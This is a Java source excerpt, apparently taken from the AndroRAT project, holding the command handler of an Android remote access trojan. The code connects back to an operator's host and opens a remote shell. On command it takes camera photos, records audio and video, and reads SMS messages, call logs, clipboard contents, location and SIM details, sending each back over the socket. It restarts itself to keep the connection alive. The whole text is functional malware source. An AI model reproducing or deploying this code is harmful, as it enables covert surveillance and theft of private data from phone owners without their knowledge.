// https://github.com/karma9874/AndroRAT/tree/1516f5e6cad261db33f7f5bb074377de72cc6d94/Android_Code/app/src/main/java/com/example/reverseshell2/tcpConnection.java#L70-L304
public class TempClass {
    @Override
    protected Void doInBackground(String... strings) {
        Socket socket = null;
        try {

            while(true){
                Log.d(TAG,"trying");
                socket = new Socket();
                try{
                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);
                }catch (SocketTimeoutException | SocketException e){
                    Log.d(TAG,"error");
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            new tcpConnection(activity,context).execute(config.IP,config.port);
                        }
                    });

                    //new tcpConnection(activity,context).execute(config.IP,config.port);
                }
                if(socket.isConnected()){
                    Log.d(TAG,"done");
                    break;
                }
            }
            out = new DataOutputStream(socket.getOutputStream());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String model = android.os.Build.MODEL+"\n";
            String welcomeMess = "Hello there, welcome to reverse shell of "+model;
            out.write(welcomeMess.getBytes("UTF-8"));
            String line;
            while ((line = in.readLine()) != null)
            {
                Log.d(TAG, line);
                if (line.equals("exit"))
                {
                    Log.d("service_runner","called");
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            new tcpConnection(activity,context).execute(config.IP,config.port);
                        }
                    });
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        functions.jobScheduler(context);
                    }else{
                        activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            context.startService(new Intent(context,mainService.class));
                        }
                    });
                    }
                    socket.close();
                }
                else if (line.equals("camList"))
                {
                    String list = functions.get_numberOfCameras();
                    out.write(list.getBytes("UTF-8"));
                }
                else if (line.matches("takepic \\d"))
                {
                    functions.getScreenUp(activity);
                    final String[] cameraid = line.split(" ");
                    try
                    {
                        out.write("IMAGE\n".getBytes("UTF-8"));
                        mPreview.startUp(Integer.parseInt(cameraid[1]),out);
                    } catch (Exception e)
                    {
                        e.printStackTrace();
                        new jumper(context).init();
                        Log.d("done", "done");
                    }
                }
                else if (line.equals("shell"))
                {
                    out.write("SHELL".getBytes("UTF-8"));
                    shell.executeShell(socket,out);
                }
                else if (line.equals("getClipData"))
                {
                    String clipboard_data = functions.readFromClipboard();
                    if (clipboard_data != null)
                    {
                        clipboard_data = clipboard_data + "\n";
                        out.write(clipboard_data.getBytes("UTF-8"));
                    }
                    else
                        {
                        out.write("No Clipboard Data Present\n".getBytes("UTF-8"));
                    }
                }
                else if (line.equals("deviceInfo"))
                {
                    out.write(functions.deviceInfo().getBytes());
                }
                else if (line.equals("help"))
                {
                    out.write("help\n".getBytes());
                }
                else if (line.equals("clear"))
                {
                    out.write("Hello there, welcome to reverse shell \n".getBytes("UTF-8"));
                }
                else if (line.equals("getSimDetails"))
                {
                    String number = functions.getPhoneNumber(context);
                    number+="\n";
                    out.write(number.getBytes("UTF-8"));
                }
                else if (line.equals("getIP"))
                {
                    String ip_addr =  "Device Ip: "+ipAddr.getIPAddress(true)+"\n";
                    out.write(ip_addr.getBytes("UTF-8"));
                }
                else if(line.matches("vibrate \\d"))
                {
                    final String[] numbers = line.split(" ");
                    vibrate.vib(Integer.parseInt(numbers[1]));
                    String res = "Vibrating "+numbers[1]+" time successful.\n";
                    out.write(res.getBytes("UTF-8"));
                }
                else if(line.contains("getSMS "))
                {
                    String[] box = line.split(" ");
                    if(box[1].equals("inbox")){
                        out.write("readSMS inbox\n".getBytes("UTF-8"));
                        String sms = readSMS.readSMSBox("inbox");
                        out.write(sms.getBytes("UTF-8"));
                    }else if(box[1].equals("sent")){
                        out.write("readSMS sent\n".getBytes("UTF-8"));
                        String sms = readSMS.readSMSBox("sent");
                        out.write(sms.getBytes("UTF-8"));
                    }else{
                        out.write("readSMS null\n".getBytes("UTF-8"));
                        out.write("Wrong Command\n".getBytes("UTF-8"));
                    }
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getLocation"))
                {
                    out.write("getLocation\n".getBytes("UTF-8"));
                    String res = locationManager.getLocation();
                    out.write(res.getBytes("UTF-8"));
                    out.write("\n".getBytes("UTF-8"));
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("startAudio"))
                {
                    //audioManager.startRecording(out);
                    Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                    serviceIntent.putExtra("ins", "startFore");
                    ContextCompat.startForegroundService(context, serviceIntent);
                }
                else if(line.equals("stopAudio"))
                {
//                    audioManager.stopRecording(out);
                    Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                    serviceIntent.putExtra("ins", "stopFore");
                    ContextCompat.startForegroundService(context, serviceIntent);
                }
                else if(line.matches("startVideo \\d"))
                {
                    final String[] cameraid = line.split(" ");
                    Intent serviceIntent = new Intent(context, videoRecorder.class);
                    serviceIntent.putExtra("ins", "startFore");
                    serviceIntent.putExtra("cameraid", cameraid[1]);
                    ContextCompat.startForegroundService(context, serviceIntent);

                }
                else if(line.equals("stopVideo"))
                {
                    Intent serviceIntent = new Intent(context, videoRecorder.class);
                    serviceIntent.putExtra("ins","stopFore");
                    ContextCompat.startForegroundService(context,serviceIntent);
                }
                else if(line.equals("getCallLogs"))
                {
                    out.write("callLogs\n".getBytes("UTF-8"));
                    String call_logs = readCallLogs.readLogs();
                    if(call_logs==null){
                        out.write("No call logs found on the device\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }else{
                        out.write(call_logs.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }

                }
                else if(line.equals("getMACAddress"))
                {
                    String macAddress = ipAddr.getMACAddress(null);
                    macAddress+="\n";
                    out.write(macAddress.getBytes("UTF-8"));
                }
                else
                    {
                    out.write("Unknown Command \n".getBytes("UTF-8"));
                }
            }
            Log.d("service_runner","called");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            }else{
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context,mainService.class));
                    }
                });
            }
        } catch (Exception e) {
            Log.d("service_runner","called");
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    new tcpConnection(activity,context).execute(config.IP,config.port);
                }
            });
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            }else{
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context,mainService.class));
                    }
                });
            }
            e.printStackTrace();
        }
        return null ;
    }

}